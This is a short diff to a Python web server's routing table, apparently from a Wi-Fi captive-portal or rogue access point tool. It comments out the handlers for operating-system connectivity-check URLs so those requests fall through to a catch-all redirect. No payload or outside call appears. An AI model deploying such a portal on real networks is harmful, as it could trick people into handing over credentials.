@@ -206,11 +206,11 @@ def runHTTPServer(ip, port, ssl_port, t, em):
             (r"/backend/.*", BackendHandler, {
                 "em": em
             }),
-            (r"/generate_204", RedirectHandler),
-            (r"/hotspot-detect.html", RedirectHandler),
+#            (r"/generate_204", RedirectHandler),
+#            (r"/hotspot-detect.html", RedirectHandler),
             (r"/login", CaptivePortalHandler),
-            (r"/ncsi.txt", EmptyHandler),
-            (r"/connecttest.txt", EmptyHandler),
+#            (r"/ncsi.txt", EmptyHandler),
+#            (r"/connecttest.txt", EmptyHandler),
             (r"/.*", RedirectHandler),
         ],
         template_path=template.get_path(),
